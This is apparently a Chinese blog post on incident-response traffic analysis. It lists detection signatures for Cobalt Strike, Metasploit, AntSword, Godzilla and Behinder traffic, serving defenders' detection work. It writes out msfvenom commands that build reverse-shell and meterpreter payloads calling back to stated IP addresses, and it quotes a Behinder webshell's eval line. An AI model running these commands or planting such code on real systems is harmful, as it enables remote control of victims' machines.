---
layout: post
title: "应急响应-流量分析"
date: 2025-03-10 22:11:38 +0800
description: "固定的user-agent头：老版本的cobalt strike中user-agent头是固定不变的，可以作为一个特征，新版本的cobalt strike中的user-agent头是会每次都变化的。在流量中，通过http协议的url路径，在checksum8解密算法计算后，32位的后门得到的结果是92，64位的后门得到的结果是93，该特征符合未魔改Cobalt Strike的流量特征。例如，在cobalt strike4.8中两个不同的cobalt strike数据包的user-agent头是不同的。"
keywords: "应急响应--流量分析"
categories: ['未分类']
tags: ['网络安全', '系统安全', 'Web']
artid: "146165181"
image:
    path: https://api.vvhan.com/api/bing?rand=sj&artid=146165181
    alt: "应急响应-流量分析"
render_with_liquid: false
featuredImage: https://bing.ee123.net/img/rand?artid=146165181
featuredImagePreview: https://bing.ee123.net/img/rand?artid=146165181
cover: https://bing.ee123.net/img/rand?artid=146165181
image: https://bing.ee123.net/img/rand?artid=146165181
img: https://bing.ee123.net/img/rand?artid=146165181
---

<div class="blog-content-box">
 <div class="article-header-box">
  <div class="article-header">
   <div class="article-title-box">
    <h1 class="title-article" id="articleContentId">
     应急响应--流量分析
    </h1>
   </div>
  </div>
 </div>
 <article class="baidu_pl">
  <div class="article_content clearfix" id="article_content">
   <link href="../../assets/css/kdoc_html_views-1a98987dfd.css" rel="stylesheet"/>
   <link href="../../assets/css/ck_htmledit_views-704d5b9767.css" rel="stylesheet"/>
   <div class="htmledit_views" id="content_views">
    <h2 style="background-color:transparent; margin-left:0.0001pt; margin-right:0px; text-align:justify">
     （一）Cobalt Strike流量特征分析
    </h2>
    <h3 style="background-color:transparent; margin-left:0.0001pt; margin-right:0px; text-align:justify">
     1.HTTP特征
    </h3>
    <h4 style="margin-left:0.0001pt; margin-right:0px; text-align:justify">
     源码特征：
    </h4>
    <p style="margin-left:.0001pt; margin-right:0; text-align:justify">
     在流量中，通过http协议的url路径，在checksum8解密算法计算后，32位的后门得到的结果是92，64位的后门得到的结果是93，该特征符合未魔改Cobalt Strike的流量特征。
    </p>
    <pre><code class="language-java">public class EchoTest {
  public static long checksum8(String text) {
    if (text.length() &lt; 4) {
      return 0L;
    }
    text = text.replace("/", "");
    long sum = 0L;
    for (int x = 0; x &lt; text.length(); x++) {
      sum += text.charAt(x);
    }
    return sum % 256L;
  }
  public static void main(String[] args) throws Exception {
    System.out.println(checksum8("flJA"));
  }
}</code></pre>
    <p>
     <img alt="" height="98" src="https://i-blog.csdnimg.cn/direct/c467a9c746074962a902349c433cb3a9.png" width="830"/>
    </p>
    <h4 style="margin-left:0.0001pt; margin-right:0px; text-align:justify">
     流量特征：
    </h4>
    <p style="margin-left:.0001pt; margin-right:0; text-align:justify">
     固定的user-agent头：老版本的cobalt strike中user-agent头是固定不变的，可以作为一个特征，新版本的cobalt strike中的user-agent头是会每次都变化的。
    </p>
    <p style="margin-left:.0001pt; margin-right:0; text-align:justify">
     例如，在cobalt strike4.8中两个不同的cobalt strike数据包的user-agent头是不同的。
    </p>
    <p style="margin-left:.0001pt; margin-right:0; text-align:justify">
     <img alt="" height="384" src="https://i-blog.csdnimg.cn/direct/e11c083047304da1b06872269d2fb662.png" width="667"/>
    </p>
    <p>
    </p>
    <h4 style="margin-left:0.0001pt; margin-right:0px; text-align:justify">
     特殊的请求特征:
    </h4>
    <p style="margin-left:.0001pt; margin-right:0; text-align:justify">
     在使用cobalt strike下达指令时，会出现post请求/sumbit.php？id=xxx的特征，该特征可以判断cobalt strike。
    </p>
    <p>
     <img alt="" height="208" src="https://i-blog.csdnimg.cn/direct/c6a4f9f7fea446e2a775192109aecb1c.png" width="830"/>
    </p>
    <h4 style="margin-left:0.0001pt; margin-right:0px; text-align:justify">
     魔改后的cobalt strike遗留特征:
    </h4>
    <p style="margin-left:.0001pt; margin-right:0; text-align:justify">
     即使cobalt strike进行了证书文件的魔改，可以消除数据包的部分特征，但仍有部分特征没有修改，例如该图中是修改了cobalt strike证书文件的数据包情况，但是遗留了GET /cx和POST /q.cgi这两个特征。
    </p>
    <p style="margin-left:.0001pt; margin-right:0; text-align:justify">
     <img alt="" height="362" src="https://i-blog.csdnimg.cn/direct/2e74ca5667764c6989f03e8a274029ce.png" width="831"/>
    </p>
    <p style="margin-left:.0001pt; margin-right:0; text-align:justify">
     工具：https://blog.didierstevens.com/didier-stevens-suite/
    </p>
    <h3>
     2.HTTPS特征
    </h3>
    <h4 style="margin-left:0.0001pt; margin-right:0px; text-align:justify">
     证书特征：
    </h4>
    <p style="margin-left:.0001pt; margin-right:0; text-align:justify">
     如果没有修改cobalt strike的证书或者自己手动加载自定义证书，默认的cobalt strike证书可以直接判断出该工具是cobalt strike。
    </p>
    <h4 style="margin-left:0.0001pt; margin-right:0px; text-align:justify">
     JA3特征：
    </h4>
    <p style="margin-left:.0001pt; margin-right:0; text-align:justify">
     在数据包的client hello中，数据包有JA3和操作系统有关，每个操作系统都有固定的值，例如我使用的操作系统为windows11
    </p>
    <p style="margin-left:.0001pt; margin-right:0; text-align:justify">
     <img alt="" height="316" src="https://i-blog.csdnimg.cn/direct/31e2e0000b5f4a21acb0f929e97c50d9.png" width="614"/>
    </p>
    <h4 style="margin-left:0.0001pt; margin-right:0px; text-align:justify">
     JA3S特征：
    </h4>
    <p style="margin-left:.0001pt; margin-right:0; text-align:justify">
     在数据包的server hello中，数据包有JA3s和操作系统有关，每个操作系统都有固定的值，例如我使用的操作系统为windows11
    </p>
    <h2 style="text-align:justify">
     （二）MSF的流量特征分析
    </h2>
    <h3 style="background-color:transparent; text-align:justify">
     1.TCP特征
    </h3>
    <p style="margin-left:.0001pt; margin-right:0; text-align:justify">
     msfvenom -p windows/shell/reverse_tcp lhost=116.62.152.86 lport=1234 -f exe -o test1.exe
    </p>
    <p style="margin-left:.0001pt; margin-right:0; text-align:justify">
     利用明文传输（查看流量包，追踪流选择tcp），都含有MZ头和DOS异常
    </p>
    <p style="margin-left:.0001pt; margin-right:0; text-align:justify">
     <img alt="" height="111" src="https://i-blog.csdnimg.cn/direct/34133a385f3147ef93b1e2a0f09c4ca6.png" width="829"/>
    </p>
    <h3 style="text-align:justify">
     2.HTTP特征
    </h3>
    <p style="margin-left:.0001pt; margin-right:0; text-align:justify">
     msfvenom -p windows/meterpreter/reverse_http lhost=10.236.32.154 lport=4445 -f exe -o test.exe
    </p>
    <p style="margin-left:.0001pt; margin-right:0; text-align:justify">
     有MZ头和DOS异常(因为都是meterpreter类型)、但是多了请求包和返回包
    </p>
    <h4 style="margin-left:0.0001pt; margin-right:0px; text-align:justify">
     32位：
    </h4>
    <p style="margin-left:.0001pt; margin-right:0; text-align:justify">
     <img alt="" height="190" src="https://i-blog.csdnimg.cn/direct/62658f8ce7e94747b9f75ae6781a42ba.png" width="831"/>
    </p>
    <pre><code class="language-java">请求包：
UA：Mozilla/5.0，
Connection: Keep-Alive
Cache-Control: no-cache
返回包
HTTP/1.1 200 OK
Content-Type: application/octet-stream
Connection: Keep-Alive
Server: Apache
Content-Length: 176732</code></pre>
    <h4 style="margin-left:0.0001pt; margin-right:0px; text-align:justify">
     64位：
    </h4>
    <p style="margin-left:.0001pt; margin-right:0; text-align:justify">
     <img alt="" height="164" src="https://i-blog.csdnimg.cn/direct/5cdfe06d75914629905bfd266980fa0a.png" width="830"/>
    </p>
    <pre><code class="language-java">请求包：
GET /Host:Cache-Control:no-cache
返回包：
HITP/1.1 200 OK
Content-Type:application/octet-stream
Connection:close
Server: Apache
Content-Length:201820</code></pre>
    <h3 style="text-align:justify">
     3.HTTPS特征
    </h3>
    <p style="margin-left:.0001pt; margin-right:0; text-align:justify">
     msfvenom -p windows/x64/meterpreter/reverse_https lhost=10.236.0.30 lport=4445 -f exe -o test.exe
    </p>
    <p style="margin-left:.0001pt; margin-right:0; text-align:justify">
     https的特征是流量中会含有Client Hello和Server Holle这四个包
    </p>
    <p style="margin-left:.0001pt; margin-right:0; text-align:justify">
     Client包里面有JA值，Server包里面有JAS值
    </p>
    <h2 style="margin-left:0.0001pt; margin-right:0px; text-align:justify">
     <img alt="" height="186" src="https://i-blog.csdnimg.cn/direct/a71f1406ed1344289d1a983036655ff5.png" width="830"/>
    </h2>
    <h2 style="text-align:justify">
     (三)蚁剑的流量特征
    </h2>
    <h3 style="text-align:justify">
     1.User-Agent
    </h3>
    <p style="margin-left:.0001pt; margin-right:0; text-align:justify">
     请求中的User-Agent值是：antSword/*；也有可能是：Mozilla/5.0 (Windows NT ) AppleWebKit/ (KHTML, like Gecko) Chrome/* Safari/
    </p>
    <h3 style="text-align:justify">
     2.关键字
    </h3>
    <p style="margin-left:.0001pt; margin-right:0; text-align:justify">
     请求中可以检测到的关键字：“eval””eVAL”
    </p>
    <p style="margin-left:.0001pt; margin-right:0; text-align:justify">
     请求体存在@ini_set(“display_errors”, “0”);@set_time_limit(0);（开头可能是菜刀或者是蚁剑）
    </p>
    <p style="margin-left:.0001pt; margin-right:0; text-align:justify">
     <img alt="" height="250" src="https://i-blog.csdnimg.cn/direct/a85796c55fb048a4a1297cd8d34ac8bf.png" width="831"/>
    </p>
    <h2 style="text-align:justify">
     （四）哥斯拉的流量特征
    </h2>
    <h3 style="text-align:justify">
     1.强特征Cookie：
    </h3>
    <p style="margin-left:.0001pt; margin-right:0; text-align:justify">
     cookie字段，最后一个Cookie的值出现;（尾值出现分号）
    </p>
    <h3 style="text-align:justify">
     2.请求头Accept:
    </h3>
    <p style="margin-left:.0001pt; margin-right:0; text-align:justify">
     请求中的Accept头是：
    </p>
    <p style="margin-left:.0001pt; margin-right:0; text-align:justify">
     Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8
    </p>
    <h3 style="text-align:justify">
     3.payload特征
    </h3>
    <p style="margin-left:.0001pt; margin-right:0; text-align:justify">
     jsp会出现xc，pass字符和Java反射，base64加解码等特征，php，asp则为普通的一句话木马。
    </p>
    <h3 style="text-align:justify">
     4.Connection响应
    </h3>
    <p style="margin-left:.0001pt; margin-right:0; text-align:justify">
     哥斯拉会响应三次，还有一个地方需要注意的就是webshell连接，所以一般会设置长时间连接，所以connection这里会是keep-alive
    </p>
    <h3 style="text-align:justify">
     5.响应头中的Cache-Control头
    </h3>
    <p style="margin-left:.0001pt; margin-right:0; text-align:justify">
     响应头中的Cache-Control头是：Cache-Control: no-store, no-cache, must-revalidate
    </p>
    <h3 style="text-align:justify">
     6.响应体的数据
    </h3>
    <p style="margin-left:.0001pt; margin-right:0; text-align:justify">
     响应体的数据有一定特征，哥斯拉会把一个32位的md5字符串按照一半拆分，分别放在base64编码的数据的前后两部分。整个响应包的结构体征为：md5前十六位+base64+md5后十六位。
    </p>
    <h2 style="margin-left:0.0001pt; margin-right:0px; text-align:justify">
     （五）冰蝎的流量特征
    </h2>
    <h3 style="text-align:justify">
     1.User-agent字段
    </h3>
    <pre><code class="language-java">Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)  

Mozilla/5.0 (Windows; U; Windows NT 6.1; en\-US) AppleWebKit/533+ (KHTML, like Gecko) Element Browser/5.0  

Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)  

Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.37 Edge/16.16299  

Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0  

Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36  

Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)  

Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko  

Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0  

Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0  

Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36  

Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko  

Mozilla/7.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; Xbox)</code></pre>
    <h3 style="text-align:justify">
     2.Content-type:
    </h3>
    <p style="margin-left:.0001pt; margin-right:0; text-align:justify">
     Content-type:Application/x-www-form-urlencoded
    </p>
    <h3 style="text-align:justify">
     3.Connection字段：
    </h3>
    <p style="margin-left:.0001pt; margin-right:0; text-align:justify">
     Connection: Keep-Alive(冰蝎默认使用的长连接是为了避免频繁的握手造成的资源丢失)
    </p>
    <h3 style="text-align:justify">
     4.Accept字段
    </h3>
    <p style="margin-left:.0001pt; margin-right:0; text-align:justify">
     请求头中存在Accept: application/json, text/javascript, /; q=0.01
    </p>
    <p style="margin-left:.0001pt; margin-right:0; text-align:justify">
     也有可能Accept: text/html,image/gif, image/jpeg, *; q=.2, /; q=.2
    </p>
    <p style="margin-left:.0001pt; margin-right:0; text-align:justify">
     Content-Type: application/octet-stream ******q=0.8
    </p>
    <h3 style="text-align:justify">
     5.端口
    </h3>
    <p style="margin-left:.0001pt; margin-right:0; text-align:justify">
     冰蝎与webshell建立连接的同时，javaw也与目的主机建立tcp连接，每次连接使用本地端口在49700左右，每连接一次，每建立一次新的连接，端口就依次增加。
    </p>
    <h3 style="text-align:justify">
     6.PHP webshell 中存在固定代码
    </h3>
    <p style="margin-left:.0001pt; margin-right:0; text-align:justify">
     $post\=Decrypt(file\_get\_contents(“php://input”));
    </p>
    <p style="margin-left:.0001pt; margin-right:0; text-align:justify">
     eval($post);
    </p>
    <h3 style="text-align:justify">
     7.请求头与响应包
    </h3>
    <p style="margin-left:.0001pt; margin-right:0; text-align:justify">
     有固定的请求头和响应头，请求字节头：dFAXQV1LORcHRQtLRlwMAhwFTAg/M ，响应字节头：TxcWR1NNExZAD0ZaAWMIPAZjH1BFBFtHThcJSlUXWEd
    </p>
    <p style="margin-left:.0001pt; margin-right:0; text-align:justify">
     默认时，冰蝎 webshell都有“e45e329feb5d925b” 一串密钥，与冰蝎3.0相同
    </p>
    <p>
    </p>
    <p>
    </p>
   </div>
  </div>
 </article>
 <p alt="68747470733a2f2f:626c6f672e6373646e2e6e65742f6c6561665f6c75636b792f:61727469636c652f64657461696c732f313436313635313831" class_="artid" style="display:none">
 </p>
</div>


